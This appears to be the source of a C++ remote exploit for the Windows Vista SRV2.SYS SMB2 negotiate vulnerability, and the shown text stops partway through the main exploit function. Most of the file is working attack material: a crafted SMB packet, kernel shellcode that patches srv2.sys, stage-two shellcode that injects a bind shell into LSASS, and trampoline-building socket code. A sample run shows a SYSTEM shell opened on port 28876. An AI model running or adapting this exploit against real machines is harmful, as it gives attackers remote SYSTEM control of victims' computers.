// 09050.cpp : 定义控制台应用程序的入口点。
//
/*
#Oct/2009#


ÛÛÛ       ÛÛÛÛÛÛ
ÛÛÛÛÛÛÛÛÛÛ                             ÛÛÛÛ   ÛÛÛÛÛÛÛÛÛÛ
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛ                          ÛÛÛÛÛÛ  ÛÛÛÛÛÛÛÛÛÛÛÛ
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ                         ÛÛÛÛÛÛ  ÛÛÛÛÛÛÛ   ÛÛÛ
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ                         ÛÛÛ ÛÛÛ  ÛÛÛÛ      ÛÛÛ
ÛÛÛÛÛÛÛ     ÛÛÛ                         ÛÛÛ ÛÛÛ  ÛÛÛÛ      ÛÛÛÛ
ÛÛÛÛÛ      ÛÛÛ                           ÛÛÛÛÛÛ   ÛÛÛÛÛÛ   ÛÛÛÛÛ
ÛÛÛÛ      ÛÛ                            ÛÛÛ ÛÛ    ÛÛÛÛ    ÛÛÛÛÛ
ÛÛÛ                                    ÛÛÛ ÛÛ           ÛÛÛÛÛÛ
ÛÛÛÛ                      ÛÛÛ   ÛÛ    ÛÛÛ ÛÛÛ         ÛÛÛÛÛÛÛ
ÛÛÛÛÛÛÛ             ÛÛÛ  ÛÛÛÛ  ÛÛÛÛ   ÛÛÛÛÛÛ        ÛÛÛÛÛÛÛ
ÛÛÛÛÛÛÛÛ         ÛÛÛ  ÛÛÛÛÛ ÛÛÛÛÛ  ÛÛÛÛÛÛÛÛÛ     ÛÛÛÛÛÛÛ
ÛÛÛÛÛÛÛ      ÛÛÛÛ ÛÛÛÛÛ ÛÛÛÛÛ   ÛÛÛÛÛÛÛÛÛ    ÛÛÛÛÛÛ
ÛÛÛÛ     ÛÛÛ ÛÛÛÛÛÛÛÛÛÛÛÛ  ÛÛÛÛ ÛÛÛÛÛ   ÛÛÛÛÛÛ
ÛÛÛÛ   ÛÛÛ ÛÛÛÛÛÛÛÛÛÛÛÛ   ÛÛÛ  ÛÛÛÛ   ÛÛÛÛÛ
ÛÛÛ   ÛÛÛÛÛÛ ÛÛÛÛÛÛÛÛ  ÛÛÛÛÛ  ÛÛÛÛ ÛÛÛÛÛÛ     ÛÛÛÛ
ÛÛÛÛ   ÛÛÛÛÛ ÛÛÛÛÛ ÛÛÛ  ÛÛÛÛÛ  ÛÛÛÛÛÛÛÛÛ  ÛÛÛÛÛÛÛÛ
ÛÛÛ       ÛÛÛÛÛÛ    ÛÛÛÛ ÛÛÛÛÛ ÛÛÛÛÛÛÛ ÛÛÛÛÛÛÛ    ÛÛÛÛÛÛÛÛÛÛÛÛÛ
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ    ÛÛÛÛ ÛÛÛÛ  ÛÛÛÛÛÛ  ÛÛÛÛÛÛ      ÛÛÛÛÛÛÛÛÛÛÛ
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ       ÛÛ  ÛÛÛ   ÛÛÛÛÛ    ÛÛÛÛ       ÛÛÛÛÛÛÛÛ
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛ                   ÛÛ
ÛÛÛÛÛÛÛÛÛÛ

DISCLAIMER
----------

Author takes no responsibility for any actions with provided
informations or codes. The copyright for any material created by the
author is reserved. Any duplication of codes or texts provided here in
electronic or printed publications is not permitted without the
author's agreement. For personal and non-commercial use only.



Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
---------------------------------------------------------------------

Exploited by Piotr Bania // www.piotrbania.com
Exploit for Vista SP2/SP1 only, should be reliable!

Tested on:
Vista sp2 (6.0.6002.18005)
Vista sp1 ultimate (6.0.6001.18000)

Kudos for:
Stephen, HDM, Laurent Gaffie(bug) and all the mates i know, peace.
Special kudos for prdelka for testing this shit and all the hosters.


Sample usage
------------

> smb2_exploit.exe 192.167.0.5 45 0
> telnet 192.167.0.5 28876

Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
C:\Windows\system32>

When all is done it should spawn a port TARGET_IP:28876


RELEASE UPDATE 08/2010:
----------------------
This exploit was created almost a year ago and wasnt modified from that time
whatsoever. The vulnerability itself is patched for a long time already so
i have decided to release this little exploit. You use it for your own
responsibility and im not responsible for any potential damage this thing
can cause. Finally i don't care whether it worked for you or not.

P.S the technique itself is described here:
http://blog.metasploit.com/2009/10/smb2-351-packets-from-trampoline.html



We are a corporation
We are a company
We cut up what we're cutting up anyway

*/

#include "stdafx.h"
#include "smb.h"
#include <stdio.h>
#include <windows.h>
#include <winsock.h>
#include <assert.h>
#pragma comment(lib,"Ws2_32.lib")

#define align(x,y)				(((x)+(y)-1)&(~((y)-1)))


#define XPORT					445 
#define DEFAULT_SLEEP			45							// default sleep time between sending packets



#define	PID_FUNC				0x237						//0x0217


#define READ_ADDR								0xFFDF0D04

#define TRAMPOLINE_ADDR_DEFAULT					0xFFDF0D04				
#define SHELL_PAGE								4096


unsigned long TRAMPOLINE_ADDRS[] = { TRAMPOLINE_ADDR_DEFAULT,
TRAMPOLINE_ADDR_DEFAULT + 4,
TRAMPOLINE_ADDR_DEFAULT + 8,
TRAMPOLINE_ADDR_DEFAULT + 12,
TRAMPOLINE_ADDR_DEFAULT + 16,
TRAMPOLINE_ADDR_DEFAULT + 20,
TRAMPOLINE_ADDR_DEFAULT + 24,
TRAMPOLINE_ADDR_DEFAULT + 28,
};

#define TRAMPOLINE_ADDRS_SIZE	((sizeof(TRAMPOLINE_ADDRS)/sizeof(unsigned long))-1)



unsigned long TRAMPOLINE_ADDR = 0;
unsigned long TRAMPOLINE_ADDR_ABS_SP2 = 0x0BC;
unsigned long TRAMPOLINE_ADDR_ABS_SP1_ULTIMATE = 0x0B8;



unsigned char data[] =
{
	"\x00\x00\x00\x90"
	"\xff\x53\x4d\x42"
	"\x72\x00\x00\x00"
	"\x00\x18\x53\xc8"
	"\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"
	"\x00\x00\x00\x00\x00"
	"\x0a\x00\x02\x53\x4D\x42\x20\x32\x2E\x30\x30\x32"
};


/*

STAGE1_SHELLCODE:
----------------

Patches srv2.sys, so every next received SMB2 packet gets executed :-)


rel_EXIT_ADDR					equ	(1FC9Fh-1FB9Bh)			;(1FC97h-1FB9Bh)
rel_PATCH_WANTED_BYTE			equ	53h

rel_PATCH_ADDR_SP2				equ	(56C9h-1FB9Bh)
rel_PATCH_ADDR_SP1_ULTIMATE		equ 	(775Bh-1FB93h)

inc	ebp
mov	ebx,[esp+4]		; ret address (PAGE:0001FB9B)
pushad

; deprotect memory
mov	edx,cr0
and	edx,not 10000h
mov	cr0,edx

; is this vista sp2?
cmp	byte ptr [ebx+rel_PATCH_ADDR_SP2],rel_PATCH_WANTED_BYTE
jne	try_vista_sp1_ultimate

mov	byte ptr [ebx+rel_PATCH_ADDR_SP2],46h		; inc esi
mov	word ptr [ebx+rel_PATCH_ADDR_SP2+1],0D6FFh		; call esi
jmp	patch_done

try_vista_sp1_ultimate:

cmp	byte ptr [ebx+rel_PATCH_ADDR_SP1_ULTIMATE],rel_PATCH_WANTED_BYTE
jne	try_vista_sp0

mov	byte ptr [ebx+rel_PATCH_ADDR_SP1_ULTIMATE],46h		; inc esi
mov	word ptr [ebx+rel_PATCH_ADDR_SP1_ULTIMATE+1],0D6FFh		; call esi
jmp	patch_done

try_vista_sp0:

patch_done:
; protect memory
mov	edx,cr0
or	edx,10000h
mov	cr0,edx

popad
add	esp,4
add	ebx,rel_EXIT_ADDR
jmp	ebx

*/




unsigned char shellcode_stage1[] = {
	0x45, 0x8B, 0x5C, 0x24, 0x04, 0x60, 0x0F, 0x20, 0xC2, 0x81, 0xE2, 0xFF, 0xFF, 0xFE, 0xFF, 0x0F,
	0x22, 0xC2, 0x80, 0xBB, 0x2E, 0x5B, 0xFE, 0xFF, 0x53, 0x75, 0x12, 0xC6, 0x83, 0x2E, 0x5B, 0xFE,
	0xFF, 0x46, 0x66, 0xC7, 0x83, 0x2F, 0x5B, 0xFE, 0xFF, 0xFF, 0xD6, 0xEB, 0x1B, 0x80, 0xBB, 0xC8,
	0x7B, 0xFE, 0xFF, 0x53, 0x75, 0x12, 0xC6, 0x83, 0xC8, 0x7B, 0xFE, 0xFF, 0x46, 0x66, 0xC7, 0x83,
	0xC9, 0x7B, 0xFE, 0xFF, 0xFF, 0xD6, 0xEB, 0x00, 0x0F, 0x20, 0xC2, 0x81, 0xCA, 0x00, 0x00, 0x01,
	0x00, 0x0F, 0x22, 0xC2, 0x61, 0x83, 0xC4, 0x04, 0x81, 0xC3, 0x04, 0x01, 0x00, 0x00, 0xFF, 0xE3
};



/*

STAGE2_SHELLCODE:
----------------

Reliable ring0 shellcode, probably for all vista machines. Allocates memory in LSASS with PAGE_EXECUTE_READWRITE
attribs - so no DEP problems. Writes ring3 payload there (here it is skypher nsg shellcode), creates a thread
inside of LSASS at the ring3 area.




MEM_SIZE							equ 3000h
STACK_AREA							equ (MEM_SIZE - 1500)
VISTA_FLINK_OFFSET 					equ	0a0h
VISTA_IMAGENAME_OFFSET				equ 14ch
VISTA_IMAGEBASE_OFFSET				equ 114h

USER_CS 							equ 001Bh
USER_DS 							equ 0023h
USER_FS 							equ	003Bh
USER_GS								equ	0000h


var_2F8         = byte ptr -2F8h
var_26C         = dword ptr -26Ch
var_268         = dword ptr -268h
var_264         = dword ptr -264h
var_260         = dword ptr -260h
var_240         = dword ptr -240h
var_23C         = dword ptr -23Ch
var_238         = dword ptr -238h
var_234         = dword ptr -234h
var_230         = dword ptr -230h
var_28          = dword ptr -28h
var_24          = byte ptr -24h
BaseAddress     = dword ptr -0Ch
var_8           = byte ptr -8
AllocationSize  = dword ptr -4


dec		esi
inc		ebp			; fix: SMB header does (dec ebp)
dec		edx			; same here
add		esp,4			; same here
mov		ecx,dword ptr [esp]


pushad
push    ebp
mov     ebp, esp
sub     esp, 2F8h


; variable initialization
mov     [ebp+BaseAddress], 0
mov     [ebp+AllocationSize], MEM_SIZE


; SYSENTER_EIP_MSR Scandown
mov		ecx,176h
rdmsr
and 	ax,0f001h
ntos_loop:
dec 	eax
cmp 	dword ptr [eax],00905a4dh
jnz		ntos_loop
; EAX = ntoskrnl base


mov		esi,eax
mov		ebx,[esi+3Ch]		; PE Header offset
add		ebx,esi			; ebx=PEH
call 	get_all_apis

@delta2reg edx
mov		eax,dword ptr [edx+aZwCreateThread]

to_ZwCreateThread:
inc		eax
cmp		word ptr [eax],010C2h			; ret 10?
jne		to_ZwCreateThread
add		eax,3
mov		dword ptr [edx+aZwCreateThread],eax


; SHELLCODE GO!!!
mov 	ebx,dword ptr fs:[124h]
mov 	ebx,dword ptr [ebx+48h]					; eax = eprocess

eloop:
mov		ebx,[ebx+VISTA_FLINK_OFFSET]
sub 	ebx,VISTA_FLINK_OFFSET
mov		eax,[ebx+VISTA_IMAGENAME_OFFSET]
cmp 	eax,'sasl' ;'clac'		;'sasl'
jne		eloop

; get into the process address space
lea     eax, [ebp+var_24]
push    eax
push    ebx
mov		ebx,edx			; ebx = delta handle (edx is destroyed)
call	dword ptr [edx+aKeStackAttachProcess]

push    40h             ; Protect PAGE_EXECUTE_READWRITE
push    1000h           ; AllocationType
lea     eax, [ebp+AllocationSize]
push    eax             ; AllocationSize
push    0               ; ZeroBits
lea     eax, [ebp+BaseAddress]
push    eax             ; BaseAddress
push    0FFFFFFFFh      ; ProcessHandle
call	dword ptr [ebx+aZwAllocateVirtualMemory]
test	eax,eax
jnz		fatal_error

; context initialization
mov		ecx,2CCh			; context size
lea		edi,[ebp+var_2F8]
xor		eax,eax
rep 	stosb

mov     eax, [ebp+BaseAddress]
mov     [ebp+var_240], eax			; context EIP

mov     ecx, [ebp+BaseAddress]
add     ecx, STACK_AREA
mov     [ebp+var_234], ecx
mov     [ebp+var_230], USER_DS
mov     [ebp+var_238], 202h			; eflags
mov     [ebp+var_23C], USER_CS
mov     [ebp+var_260], USER_DS
mov     [ebp+var_264], USER_DS
mov     [ebp+var_268], USER_FS
mov     [ebp+var_26C], USER_GS


; copy shellcode to the memory
mov		edi,dword ptr [ebp+BaseAddress]
mov		ecx,ring3_shellcode_size
lea		esi,[ebx+ring3_shellcode]
rep		movsb

; create the thread
push    0
mov     eax, [ebp+BaseAddress]
add     eax, STACK_AREA
push    eax
lea     eax, [ebp+var_2F8]		; context
push    eax
push    0
push    0FFFFFFFFh
push    0
push    1F03FFh					; THREAD_ALL_ACCESS
lea     eax, [ebp+var_8]		; thread handle
push    eax
call	dword ptr [ebx+aZwCreateThread]

; go home
fatal_error:
lea     eax, [ebp+var_24]
push    eax
call    dword ptr [ebx+aKeUnstackDetachProcess]

mov     esp, ebp
pop     ebp
popad
mov		eax,103h
ret	4

; ##############################################################
; TAKE THIS TO THE SHELLCODE TO
; ##############################################################

ring3_shellcode:
jmp			ring3_shellcode_real

get_all_apis:
pushad
mov 		edx,[ebx+078h]		; export section RVA
add 		edx,esi				; normalize
xor 		ebx,ebx				; counter
mov 		ecx,[edx+020h]		; address of names
add 		ecx,esi 				; normalize
mov 		eax,[edx+01ch]		; address of functions
add 		eax,esi	              ; normalize
mov			edi,[edx+018h]		; number of names
mov			ebp,[edx+024h]		; address of ordinals
add			ebp,esi
loop_it:
mov 		edx,[ecx]			; get one name
add 		edx,esi		      	; normalize, EDX=name

; now take the ordinal of this one
push 		eax
push		ebx
movzx		ebx,word ptr [ebp+ebx*2]
and			ebx,0000ffffh

; get export address
mov			eax,[eax+ebx*4]
add			eax,esi				; EAX=function addr

; checksum check
call		checksumADLER_and_store

pop			ebx
pop 		eax
next_one:
add 		ecx,4
inc			ebx
dec			edi
jnz			loop_it
popad
ret


; -------------------------------------------------------------------
; Checks if the API name is correct with the checksum and then
; stores the api to the address table. Retrieves all apis in the table
; on entry:
; * EDX = name
; * EAX = function addr
;
; on out the API table is filled!
; -------------------------------------------------------------------

checksumADLER_and_store:
pushad
mov		ebx,eax				; function addr

call	checksum_ADLER32		; EAX -> computed checksum
mov		edx,eax				; EDX -> computed checksum

call	delta_api
delta_api:
pop		ebp
lea		esi,[ebp+(offset API_table_checkums - offset delta_api)]
lea		edi,[ebp+(offset API_table_addrs - offset delta_api)-4]
api_chk_loop:
add		edi,4
lodsd
test	eax,eax
jz		api_chk_done
cmp		eax,edx
jne		api_chk_loop
mov		[edi],ebx
api_chk_done:
popad
ret






; -------------------------------------------------------------------
; Computes Adler32 checksum without MOD
; Input:
; 	EDX - string
; Output:
;	EAX - checksum
checksum_ADLER32:
push	ecx
push	ebx
push	edx

xor		ecx,ecx
xor		eax,eax
xor 	ebx,ebx		; EBX = B = 0
inc		eax		; EAX = A = 1

make_ADLER:
mov		cl,byte ptr [edx]
test	cl,cl
jz		done_ADLER

add		eax,ecx		; A += CHAR
add		ebx,eax		; B += A
inc		edx

jmp		make_ADLER

done_ADLER:
shl		ebx,16
or		eax,ebx		; EAX = final checksum

pop		edx
pop		ebx
pop		ecx
ret


API_table_checkums:
adler32_ZwAllocateVirtualMemory     	dd 6de90957h
;adler32_ZwCreateThread					dd 28ea057eh		; not exported
adler32_KeStackAttachProcess			dd 500907dbh
adler32_KeUnstackDetachProcess			dd 61ec08b2h
adler32_ZwCreateSymbolicLinkObject		dd 8a980a4dh
adler32_CreateThread					dd 1df104adh
adler32_Sleep							dd 05bd01fah
adler32_ExitThread						dd 158503f3h
dd 00000000h		; end of table
API_table_addrs:
aZwAllocateVirtualMemory     			dd 0h
aKeStackAttachProcess					dd 0h
aKeUnstackDetachProcess					dd 0h
aZwCreateThread							dd 0h
aCreateThread							dd 0h				; from kernel32
aSleep									dd 0h				; from kernel32
aExitThread								dd 0h				; from kernel32


ring3_shellcode_real:
push	USER_FS
pop		fs
push	USER_DS
pop		ds
push	USER_DS
pop		es
cld

mov eax, dword ptr fs:[30h]
mov eax, dword ptr [eax+0ch]
mov esi, dword ptr [eax+1ch]
lodsd
mov esi, dword ptr [eax+08h] ;kernel32 base
mov	ebx,[esi+3Ch]		; PE Header offset
add	ebx,esi			; ebx=PEH
call get_all_apis

@delta2reg ebp
xor		eax,eax
push	eax
push	eax
lea 	ebx,[ebp+meta_shell]
push	ebx
push	eax
push	eax
call	dword ptr [ebp+aCreateThread]

sleep_die:
push	9999999h
call	dword ptr [ebp+aSleep]
jmp		sleep_die

; some typical r3 shellcode now
seh_frame:
rseh
@delta2reg eax
call	dword ptr [eax+aExitThread]


meta_shell:
; setup a SEH frame first if something fucks up
pseh	<jmp seh_frame>
sub		esp,600
include r3_meta.inc


ring3_shellcode_size						equ	$-offset ring3_shellcode

*/




unsigned char shellcode_stage2[] = {
	0x4E, 0x45, 0x4A, 0x83, 0xC4, 0x04, 0x8B, 0x0C, 0x24, 0x60, 0x55, 0x8B, 0xEC, 0x81, 0xEC, 0xF8,
	0x02, 0x00, 0x00, 0xC7, 0x45, 0xF4, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x45, 0xFC, 0x00, 0x30, 0x00,
	0x00, 0xB9, 0x76, 0x01, 0x00, 0x00, 0x0F, 0x32, 0x66, 0x25, 0x01, 0xF0, 0x48, 0x81, 0x38, 0x4D,
	0x5A, 0x90, 0x00, 0x75, 0xF7, 0x8B, 0xF0, 0x8B, 0x5E, 0x3C, 0x03, 0xDE, 0xE8, 0x32, 0x01, 0x00,
	0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5A, 0x81, 0xEA, 0x47, 0x10, 0x40, 0x00, 0x8B, 0x82, 0x26,
	0x12, 0x40, 0x00, 0x40, 0x66, 0x81, 0x38, 0xC2, 0x10, 0x75, 0xF8, 0x83, 0xC0, 0x03, 0x89, 0x82,
	0x26, 0x12, 0x40, 0x00, 0x64, 0x67, 0x8B, 0x1E, 0x24, 0x01, 0x8B, 0x5B, 0x48, 0x8B, 0x9B, 0xA0,
	0x00, 0x00, 0x00, 0x81, 0xEB, 0xA0, 0x00, 0x00, 0x00, 0x8B, 0x83, 0x4C, 0x01, 0x00, 0x00, 0x3D,
	0x6C, 0x73, 0x61, 0x73, 0x75, 0xE7, 0x8D, 0x45, 0xDC, 0x50, 0x53, 0x8B, 0xDA, 0xFF, 0x92, 0x1E,
	0x12, 0x40, 0x00, 0x6A, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x8D, 0x45, 0xFC, 0x50, 0x6A, 0x00,
	0x8D, 0x45, 0xF4, 0x50, 0x6A, 0xFF, 0xFF, 0x93, 0x1A, 0x12, 0x40, 0x00, 0x85, 0xC0, 0x0F, 0x85,
	0xA4, 0x00, 0x00, 0x00, 0xB9, 0xCC, 0x02, 0x00, 0x00, 0x8D, 0xBD, 0x08, 0xFD, 0xFF, 0xFF, 0x33,
	0xC0, 0xF3, 0xAA, 0x8B, 0x45, 0xF4, 0x89, 0x85, 0xC0, 0xFD, 0xFF, 0xFF, 0x8B, 0x4D, 0xF4, 0x81,
	0xC1, 0x24, 0x2A, 0x00, 0x00, 0x89, 0x8D, 0xCC, 0xFD, 0xFF, 0xFF, 0xC7, 0x85, 0xD0, 0xFD, 0xFF,
	0xFF, 0x23, 0x00, 0x00, 0x00, 0xC7, 0x85, 0xC8, 0xFD, 0xFF, 0xFF, 0x02, 0x02, 0x00, 0x00, 0xC7,
	0x85, 0xC4, 0xFD, 0xFF, 0xFF, 0x1B, 0x00, 0x00, 0x00, 0xC7, 0x85, 0xA0, 0xFD, 0xFF, 0xFF, 0x23,
	0x00, 0x00, 0x00, 0xC7, 0x85, 0x9C, 0xFD, 0xFF, 0xFF, 0x23, 0x00, 0x00, 0x00, 0xC7, 0x85, 0x98,
	0xFD, 0xFF, 0xFF, 0x3B, 0x00, 0x00, 0x00, 0xC7, 0x85, 0x94, 0xFD, 0xFF, 0xFF, 0x00, 0x00, 0x00,
	0x00, 0x8B, 0x7D, 0xF4, 0xB9, 0x16, 0x02, 0x00, 0x00, 0x8D, 0xB3, 0x6F, 0x11, 0x40, 0x00, 0xF3,
	0xA4, 0x6A, 0x00, 0x8B, 0x45, 0xF4, 0x05, 0x24, 0x2A, 0x00, 0x00, 0x50, 0x8D, 0x85, 0x08, 0xFD,
	0xFF, 0xFF, 0x50, 0x6A, 0x00, 0x6A, 0xFF, 0x6A, 0x00, 0x68, 0xFF, 0x03, 0x1F, 0x00, 0x8D, 0x45,
	0xF8, 0x50, 0xFF, 0x93, 0x26, 0x12, 0x40, 0x00, 0x8D, 0x45, 0xDC, 0x50, 0xFF, 0x93, 0x22, 0x12,
	0x40, 0x00, 0x8B, 0xE5, 0x5D, 0x61, 0xB8, 0x03, 0x01, 0x00, 0x00, 0xC2, 0x04, 0x00, 0xE9, 0xC2,
	0x00, 0x00, 0x00, 0x60, 0x8B, 0x53, 0x78, 0x03, 0xD6, 0x33, 0xDB, 0x8B, 0x4A, 0x20, 0x03, 0xCE,
	0x8B, 0x42, 0x1C, 0x03, 0xC6, 0x8B, 0x7A, 0x18, 0x8B, 0x6A, 0x24, 0x03, 0xEE, 0x8B, 0x11, 0x03,
	0xD6, 0x50, 0x53, 0x0F, 0xB7, 0x5C, 0x5D, 0x00, 0x81, 0xE3, 0xFF, 0xFF, 0x00, 0x00, 0x8B, 0x04,
	0x98, 0x03, 0xC6, 0xE8, 0x0B, 0x00, 0x00, 0x00, 0x5B, 0x58, 0x83, 0xC1, 0x04, 0x43, 0x4F, 0x75,
	0xDC, 0x61, 0xC3, 0x60, 0x8B, 0xD8, 0xE8, 0x1E, 0x00, 0x00, 0x00, 0x8B, 0xD0, 0xE8, 0x00, 0x00,
	0x00, 0x00, 0x5D, 0x8D, 0x75, 0x37, 0x8D, 0x7D, 0x53, 0x83, 0xC7, 0x04, 0xAD, 0x85, 0xC0, 0x74,
	0x06, 0x3B, 0xC2, 0x75, 0xF4, 0x89, 0x1F, 0x61, 0xC3, 0x51, 0x53, 0x52, 0x33, 0xC9, 0x33, 0xC0,
	0x33, 0xDB, 0x40, 0x8A, 0x0A, 0x84, 0xC9, 0x74, 0x07, 0x03, 0xC1, 0x03, 0xD8, 0x42, 0xEB, 0xF3,
	0xC1, 0xE3, 0x10, 0x0B, 0xC3, 0x5A, 0x5B, 0x59, 0xC3, 0x57, 0x09, 0xE9, 0x6D, 0xDB, 0x07, 0x09,
	0x50, 0xB2, 0x08, 0xEC, 0x61, 0x4D, 0x0A, 0x98, 0x8A, 0xAD, 0x04, 0xF1, 0x1D, 0xFA, 0x01, 0xBD,
	0x05, 0xF3, 0x03, 0x85, 0x15, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x6A, 0x3B, 0x0F, 0xA1, 0x6A, 0x23, 0x1F, 0x6A, 0x23, 0x07, 0xFC,
	0x64, 0x67, 0xA1, 0x30, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x70, 0x1C, 0xAD, 0x8B, 0x70, 0x08, 0x8B,
	0x5E, 0x3C, 0x03, 0xDE, 0xE8, 0x1A, 0xFF, 0xFF, 0xFF, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5D, 0x81,
	0xED, 0x5F, 0x12, 0x40, 0x00, 0x33, 0xC0, 0x50, 0x50, 0x8D, 0x9D, 0x9D, 0x12, 0x40, 0x00, 0x53,
	0x50, 0x50, 0xFF, 0x95, 0x2A, 0x12, 0x40, 0x00, 0x68, 0x99, 0x99, 0x99, 0x09, 0xFF, 0x95, 0x2E,
	0x12, 0x40, 0x00, 0xEB, 0xF3, 0x33, 0xD2, 0x64, 0x8F, 0x02, 0x5A, 0xE8, 0x00, 0x00, 0x00, 0x00,
	0x58, 0x2D, 0x91, 0x12, 0x40, 0x00, 0xFF, 0x90, 0x32, 0x12, 0x40, 0x00, 0xE8, 0x02, 0x00, 0x00,
	0x00, 0xEB, 0xE2, 0x33, 0xD2, 0x64, 0xFF, 0x32, 0x64, 0x89, 0x22, 0x81, 0xEC, 0x58, 0x02, 0x00,
	0x00, 0x31, 0xC9, 0x64, 0x8B, 0x71, 0x30, 0x8B, 0x76, 0x0C, 0x8B, 0x76, 0x1C, 0x8B, 0x6E, 0x08,
	0x8B, 0x7E, 0x20, 0x8B, 0x36, 0x38, 0x4F, 0x18, 0x75, 0xF3, 0x51, 0x68, 0x32, 0x5F, 0x33, 0x32,
	0x68, 0x66, 0x56, 0x77, 0x73, 0x68, 0xB7, 0x8F, 0x09, 0x98, 0x89, 0xE6, 0xB5, 0x03, 0x29, 0xCC,
	0x29, 0xCC, 0x89, 0xE7, 0xD6, 0xF3, 0xAA, 0x41, 0x51, 0x41, 0x51, 0x57, 0x51, 0x83, 0xEF, 0x2C,
	0xA4, 0x4F, 0x8B, 0x5D, 0x3C, 0x8B, 0x5C, 0x1D, 0x78, 0x01, 0xEB, 0x8B, 0x4B, 0x20, 0x01, 0xE9,
	0x56, 0x31, 0xD2, 0x42, 0x8B, 0x34, 0x91, 0x01, 0xEE, 0xB4, 0x36, 0xAC, 0x34, 0x71, 0x28, 0xC4,
	0x3C, 0x71, 0x75, 0xF7, 0x3A, 0x27, 0x75, 0xEB, 0x5E, 0x8B, 0x4B, 0x24, 0x01, 0xE9, 0x0F, 0xB7,
	0x14, 0x51, 0x8B, 0x4B, 0x1C, 0x01, 0xE9, 0x89, 0xE8, 0x03, 0x04, 0x91, 0xAB, 0x80, 0x3E, 0x09,
	0x75, 0x08, 0x8D, 0x5E, 0x04, 0x53, 0xFF, 0xD0, 0x57, 0x95, 0x80, 0x3E, 0x73, 0x75, 0xB1, 0x5E,
	0xAD, 0xFF, 0xD0, 0xAD, 0xFF, 0xD0, 0x95, 0x81, 0x2F, 0xFE, 0xFF, 0x8F, 0x33, 0x6A, 0x10, 0x57,
	0xAD, 0x55, 0xFF, 0xD0, 0x85, 0xC0, 0x74, 0xF8, 0x31, 0xD2, 0x52, 0x68, 0x63, 0x6D, 0x64, 0x20,
	0x8D, 0x7C, 0x24, 0x38, 0xAB, 0xAB, 0xAB, 0xC6, 0x47, 0xE9, 0x01, 0x54, 0x87, 0x3C, 0x24, 0x57,
	0x52, 0x52, 0x52, 0xC6, 0x47, 0xEF, 0x08, 0x57, 0x52, 0x52, 0x57, 0x52, 0xFF, 0x56, 0xE4, 0x8B,
	0x46, 0xFC, 0xEB, 0xCD
};


// globals
sockaddr_in			client;
SOCKET				sock;
NEGOTIATE_REQ		*nr;

int					sleep_time = DEFAULT_SLEEP;
u32					SHELL_SIZE = 0;




int init_connection(void)
{
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
	{
		printf("Error at socket(): %d\n", WSAGetLastError());
		WSACleanup();
		return 0;
	}

	if (connect(sock, (SOCKADDR*)&client, sizeof(client)) == SOCKET_ERROR)
	{
		printf("Failed to connect.\n");
		closesocket(sock);
		WSACleanup();
		return 0;
	}

	return 1;
}


int create_trampoline(int off_pass, unsigned long req_value)
{
	unsigned char *p = (unsigned char*)nr;
	nr->hdr.PidHigh = PID_FUNC;

	// for vista sp2 (6.0.6002.18005)
	*(u32*)(p + 0x3C + 4) = READ_ADDR;
	*(u8*)(p + 0xCC + 4) = 0xCC;
	*(u32*)(p + 0xAC + 4) = TRAMPOLINE_ADDR + off_pass;
	*(u32*)(p + 0x0CE + 4) = 0x0;
	*(u32*)(p + 0x30 + 4) = READ_ADDR;
	*(u32*)(p + 0x78 + 4) = READ_ADDR;
	*(u32*)(p + 0x168 + 4) = 0x00000000;
	*(u8*)(p + 0xE0 + 4) = 0x90 | 0x04;


	// for vista sp1 ultimate (6.0.6001.18000)
	*(u8*)(p + 0xC8 + 4) = 0xCC;
	*(u32*)(p + 0xA8 + 4) = TRAMPOLINE_ADDR + off_pass + (TRAMPOLINE_ADDR_ABS_SP2 - TRAMPOLINE_ADDR_ABS_SP1_ULTIMATE);
	*(u32*)(p + 0x74 + 4) = READ_ADDR;
	*(u8*)(p + 0xE0 + 4) = 0x90 | 0x04;
	*(u8*)(p + 0xCB + 4) = 0x00;



	printf("Making trampoline offset=%d requested value=%x\n", off_pass, req_value);
	for (int pack_count = 0; pack_count != req_value; pack_count++)
	{
		Sleep(sleep_time);
	re_send:;
		printf("Trampoline pass #%d(%x)\n", pack_count, pack_count);
		if (send(sock, (const char*)nr, SHELL_PAGE, 0) == SOCKET_ERROR)
		{
			Sleep(sleep_time);
			closesocket(sock);

			if (!init_connection())
			{
				printf("Fatal: creating trampoline failed, last pass #%d(%x)\n", pack_count - 1, pack_count - 1);
				return 0;
			}

			goto re_send;
		}

	}

	printf("Trampoline created for offset=%d requested value=%x\n", off_pass, req_value);
	closesocket(sock);
	return 1;
}


int init_trampoline(void)
{
#define check_trampo(t) { if (!t) return 0; } 

	// we need 351 packets to create the trampoline
	// we are going to build: inc esi; push esi; ret

	check_trampo(create_trampoline(0, 0x46));
	check_trampo(create_trampoline(1, 0x56));
	check_trampo(create_trampoline(2, 0xC3));
	return 1;
}


int go_exploit(void)
{

	// some of those magic hex values can be sponsored by rand()
	unsigned char *p = (unsigned char*)nr;
	nr->hdr.PidHigh = PID_FUNC;
	*(u8*)(p + 0xCC + 4) = 0x90;
	*(u32*)(p + 0xAC + 4) = 0x00000000;
	*(u32*)(p + 0x30 + 4) = READ_ADDR;
	*(u32*)(p + 0x168 + 4) = TRAMPOLINE_ADDR_ABS_SP2;
	*(u8*)(p + 0x0E0 + 4) = 0;

	// parts from shellcode
